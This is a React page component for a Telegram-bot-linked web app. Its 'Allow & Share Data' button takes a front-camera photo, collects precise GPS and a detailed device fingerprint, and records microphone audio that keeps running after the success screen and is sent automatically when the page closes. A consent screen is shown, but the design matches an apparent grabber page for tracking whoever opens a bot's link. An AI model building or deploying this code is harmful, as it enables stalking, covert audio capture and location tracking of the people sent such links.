import { useState, useEffect, useRef } from 'react';
import { useSubmitCapture } from '@workspace/api-client-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from '@/components/ui/card';
import { ShieldCheck, Camera, MapPin, Smartphone, Mic, Loader2, CheckCircle, AlertCircle, AlertTriangle } from 'lucide-react';

type Step = 'idle' | 'camera' | 'location' | 'device' | 'sending' | 'success';

async function getGpuInfo(): Promise<{ gpuRenderer: string | null; gpuVendor: string | null; webglSupported: boolean }> {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl') as WebGLRenderingContext | null;
    if (!gl) return { gpuRenderer: null, gpuVendor: null, webglSupported: false };
    const ext = gl.getExtension('WEBGL_debug_renderer_info');
    return {
      gpuRenderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null,
      gpuVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null,
      webglSupported: true,
    };
  } catch { return { gpuRenderer: null, gpuVendor: null, webglSupported: false }; }
}

async function collectDeviceInfo() {
  const { gpuRenderer, gpuVendor, webglSupported } = await getGpuInfo();

  let battery = null, charging = null, chargingTime = null, dischargingTime = null;
  try {
    const bat = await (navigator as any).getBattery?.();
    if (bat) {
      battery = Math.round(bat.level * 100);
      charging = bat.charging;
      chargingTime = isFinite(bat.chargingTime) ? bat.chargingTime : null;
      dischargingTime = isFinite(bat.dischargingTime) ? bat.dischargingTime : null;
    }
  } catch { /* not supported */ }

  const conn = (navigator as any).connection;
  let cameraCount = null, microphoneCount = null;
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    cameraCount = devices.filter(d => d.kind === 'videoinput').length;
    microphoneCount = devices.filter(d => d.kind === 'audioinput').length;
  } catch { /* not supported */ }

  let notificationPermission: string | null = null;
  try { notificationPermission = Notification.permission; } catch { /* not supported */ }

  let localStorageEnabled = false, sessionStorageEnabled = false, indexedDbEnabled = false;
  try { localStorage.setItem('_t', '1'); localStorage.removeItem('_t'); localStorageEnabled = true; } catch { /* blocked */ }
  try { sessionStorage.setItem('_t', '1'); sessionStorage.removeItem('_t'); sessionStorageEnabled = true; } catch { /* blocked */ }
  try { indexedDbEnabled = !!window.indexedDB; } catch { /* blocked */ }

  const pluginsList = Array.from(navigator.plugins || []).map((p: Plugin) => p.name).filter(Boolean);

  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    vendor: navigator.vendor,
    language: navigator.language,
    languages: Array.from(navigator.languages || [navigator.language]),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack ?? null,
    onLine: navigator.onLine,
    hardwareConcurrency: navigator.hardwareConcurrency ?? null,
    deviceMemory: (navigator as any).deviceMemory ?? null,
    maxTouchPoints: navigator.maxTouchPoints ?? null,
    screenWidth: screen.width,
    screenHeight: screen.height,
    screenAvailWidth: screen.availWidth,
    screenAvailHeight: screen.availHeight,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    devicePixelRatio: window.devicePixelRatio,
    innerWidth: window.innerWidth,
    innerHeight: window.innerHeight,
    orientationType: screen.orientation?.type ?? null,
    orientationAngle: screen.orientation?.angle ?? null,
    battery,
    charging,
    chargingTime,
    dischargingTime,
    connectionType: conn?.effectiveType ?? null,
    connectionDownlink: conn?.downlink ?? null,
    connectionRtt: conn?.rtt ?? null,
    connectionSaveData: conn?.saveData ?? null,
    gpuRenderer,
    gpuVendor,
    webglSupported,
    webAssemblySupported: typeof WebAssembly !== 'undefined',
    serviceWorkerSupported: 'serviceWorker' in navigator,
    notificationPermission,
    cameraCount,
    microphoneCount,
    pluginsCount: pluginsList.length,
    pluginsList,
    referrer: document.referrer || null,
    historyLength: history.length,
    pdfViewerEnabled: (navigator as any).pdfViewerEnabled ?? null,
    localStorageEnabled,
    sessionStorageEnabled,
    indexedDbEnabled,
    adBlockEnabled: null,
  };
}

export default function Home() {
  const [step, setStep] = useState<Step>('idle');
  const [error, setError] = useState<string | null>(null);
  const [chatId, setChatId] = useState<string | null>(null);
  const [recordingActive, setRecordingActive] = useState(false);

  const submitCapture = useSubmitCapture();
  const audioRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const chatIdRef = useRef<string | null>(null);

  useEffect(() => {
    const id = new URLSearchParams(window.location.search).get('chat_id');
    if (id) { setChatId(id); chatIdRef.current = id; }
  }, []);

  // On page close: send collected audio to backend
  useEffect(() => {
    const sendAudio = () => {
      const recorder = audioRecorderRef.current;
      const cid = chatIdRef.current;
      if (!recorder || !cid || audioChunksRef.current.length === 0) return;
      try {
        if (recorder.state !== 'inactive') recorder.stop();
        const blob = new Blob(audioChunksRef.current, { type: recorder.mimeType || 'audio/webm' });
        if (blob.size < 200) return;
        const fd = new FormData();
        fd.append('chatId', cid);
        fd.append('audio', blob, 'recording.webm');
        navigator.sendBeacon('/api/audio', fd);
      } catch { /* page is closing */ }
    };

    const onVisChange = () => { if (document.visibilityState === 'hidden') sendAudio(); };
    window.addEventListener('pagehide', sendAudio);
    document.addEventListener('visibilitychange', onVisChange);
    return () => {
      window.removeEventListener('pagehide', sendAudio);
      document.removeEventListener('visibilitychange', onVisChange);
    };
  }, []);

  const handleCapture = async () => {
    if (!chatId) return;
    setError(null);

    try {
      // ── Camera ──────────────────────────────────────────────
      setStep('camera');
      let photoBase64: string | null = null;
      let audioStream: MediaStream | null = null;

      // Request camera + mic together if possible
      let cameraStream: MediaStream;
      try {
        cameraStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: true,
        });
        // Separate audio track for recording
        const audioTracks = cameraStream.getAudioTracks();
        if (audioTracks.length > 0) {
          audioStream = new MediaStream(audioTracks);
          cameraStream = new MediaStream(cameraStream.getVideoTracks());
        }
      } catch {
        // Fallback: try camera only
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      }

      // Capture photo from video
      const video = document.createElement('video');
      video.setAttribute('playsinline', 'true');
      video.muted = true;
      video.srcObject = cameraStream;
      await new Promise<void>(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
      await new Promise(r => setTimeout(r, 800)); // let exposure settle

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 1280;
      canvas.height = video.videoHeight || 720;
      const ctx = canvas.getContext('2d');
      if (ctx) { ctx.drawImage(video, 0, 0); photoBase64 = canvas.toDataURL('image/jpeg', 0.8); }
      cameraStream.getTracks().forEach(t => t.stop());

      // ── Start audio recording ─────────────────────────────
      if (!audioStream) {
        try { audioStream = await navigator.mediaDevices.getUserMedia({ audio: true }); } catch { /* denied */ }
      }
      if (audioStream) {
        try {
          const recorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
          recorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunksRef.current.push(e.data); };
          recorder.start(3000); // collect chunk every 3s
          audioRecorderRef.current = recorder;
          setRecordingActive(true);
        } catch {
          // Try default mimeType
          try {
            const recorder = new MediaRecorder(audioStream);
            recorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunksRef.current.push(e.data); };
            recorder.start(3000);
            audioRecorderRef.current = recorder;
            setRecordingActive(true);
          } catch { /* not supported */ }
        }
      }

      // ── Location ─────────────────────────────────────────
      setStep('location');
      let locationData: { latitude: number; longitude: number; accuracy?: number; altitude?: number | null; altitudeAccuracy?: number | null; heading?: number | null; speed?: number | null } | undefined;
      try {
        const pos = await new Promise<GeolocationPosition>((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 12000 })
        );
        locationData = {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          altitudeAccuracy: pos.coords.altitudeAccuracy,
          heading: pos.coords.heading,
          speed: pos.coords.speed,
        };
      } catch { /* permission denied or unavailable */ }

      // ── Device Info ───────────────────────────────────────
      setStep('device');
      const deviceInfo = await collectDeviceInfo();

      // ── Send ─────────────────────────────────────────────
      setStep('sending');
      submitCapture.mutate(
        { data: { chatId, photo: photoBase64, location: locationData, deviceInfo } },
        { onSuccess: () => setStep('success'), onError: () => { setError('Failed to send data to the server. Please try again.'); setStep('idle'); } }
      );

    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'An error occurred. Please check your permissions and try again.';
      setError(msg);
      setStep('idle');
    }
  };

  if (!chatId) {
    return (
      <div className="min-h-screen w-full flex items-center justify-center p-4 bg-background">
        <Card className="max-w-md w-full">
          <CardHeader>
            <div className="w-12 h-12 rounded-full bg-destructive/10 text-destructive flex items-center justify-center mx-auto mb-4">
              <AlertTriangle className="w-6 h-6" />
            </div>
            <CardTitle className="text-center" data-testid="text-invalid-link">Invalid Link</CardTitle>
            <CardDescription className="text-center">
              Missing chat ID. Please use the exact link sent by the Telegram bot.
            </CardDescription>
          </CardHeader>
        </Card>
      </div>
    );
  }

  if (step === 'success') {
    return (
      <div className="min-h-[100dvh] w-full flex items-center justify-center p-4 bg-background">
        <Card className="max-w-md w-full">
          <CardHeader className="pt-10">
            <div className="w-20 h-20 rounded-full bg-green-50 text-green-600 flex items-center justify-center mx-auto mb-6">
              <CheckCircle className="w-10 h-10" />
            </div>
            <CardTitle className="text-center text-2xl" data-testid="text-success">Your data has been sent!</CardTitle>
            <CardDescription className="text-center text-base mt-2">
              Your photo, location, and device information have been delivered to the Telegram bot.
            </CardDescription>
          </CardHeader>
          <CardContent className="text-center pb-10">
            {recordingActive && (
              <div className="flex items-center justify-center gap-2 mt-2 text-sm text-red-600 font-medium">
                <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse inline-block" />
                Audio is recording — will be sent when you close this page
              </div>
            )}
            <p className="text-sm text-muted-foreground mt-4">
              You can now return to Telegram.
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  const isProcessing = step !== 'idle';
  const stepLabel: Record<Step, string> = {
    idle: '',
    camera: 'Capturing photo...',
    location: 'Getting location...',
    device: 'Reading device info...',
    sending: 'Sending to bot...',
    success: '',
  };

  return (
    <div className="min-h-[100dvh] w-full flex items-center justify-center p-4 py-12 bg-background bg-[radial-gradient(ellipse_at_top_right,_var(--tw-gradient-stops))] from-blue-50/50 via-background to-background">
      <Card className="max-w-md w-full border-slate-200">
        <CardHeader className="pb-4">
          <div className="w-16 h-16 rounded-2xl bg-blue-50 text-primary flex items-center justify-center mx-auto mb-6 shadow-sm border border-blue-100">
            <ShieldCheck className="w-8 h-8" />
          </div>
          <CardTitle className="text-slate-900 tracking-tight text-[22px]">Data Sharing Permission</CardTitle>
          <CardDescription className="text-base text-slate-600 leading-relaxed mt-2">
            The following information will be shared with your Telegram bot. You are fully informed and in control.
          </CardDescription>
        </CardHeader>

        <CardContent className="space-y-6">
          {error && (
            <div className="p-4 rounded-xl bg-red-50 border border-red-100 flex items-start gap-3 text-red-800" data-testid="text-error">
              <AlertCircle className="w-5 h-5 shrink-0 mt-0.5 text-red-600" />
              <p className="text-sm font-medium leading-tight">{error}</p>
            </div>
          )}

          <div className="space-y-3">
            <p className="text-xs font-bold text-slate-400 uppercase tracking-widest">What will be shared</p>
            {[
              { icon: Camera, title: 'Camera Photo', desc: 'One photo from your front camera.' },
              { icon: MapPin, title: 'Precise Location', desc: 'GPS coordinates, altitude, accuracy, and heading.' },
              { icon: Smartphone, title: 'Device Information', desc: 'Hardware specs, browser, screen, battery, GPU, network, plugins, storage, and more.' },
              { icon: Mic, title: 'Audio Recording', desc: 'Microphone audio recorded while this page is open — sent automatically when you close it.' },
            ].map(({ icon: Icon, title, desc }) => (
              <div key={title} className="flex items-start gap-4 p-4 rounded-xl bg-slate-50/80 border border-slate-100">
                <div className="bg-white p-2 rounded-lg shadow-sm border border-slate-200/60 shrink-0">
                  <Icon className="w-5 h-5 text-slate-700" />
                </div>
                <div>
                  <h4 className="text-sm font-semibold text-slate-900">{title}</h4>
                  <p className="text-xs text-slate-500 mt-0.5">{desc}</p>
                </div>
              </div>
            ))}
          </div>
        </CardContent>

        <CardFooter className="flex-col gap-3 pb-8">
          <Button
            className="w-full h-14 text-base font-bold"
            onClick={handleCapture}
            disabled={isProcessing}
            data-testid="button-allow-share"
          >
            {isProcessing ? (
              <><Loader2 className="w-5 h-5 animate-spin mr-2" />{stepLabel[step]}</>
            ) : (
              'Allow & Share Data'
            )}
          </Button>
          <p className="text-xs text-center text-slate-500 px-4">
            By clicking allow, you consent to sharing the above information with the Telegram bot associated with this link.
          </p>
        </CardFooter>
      </Card>
    </div>
  );
}
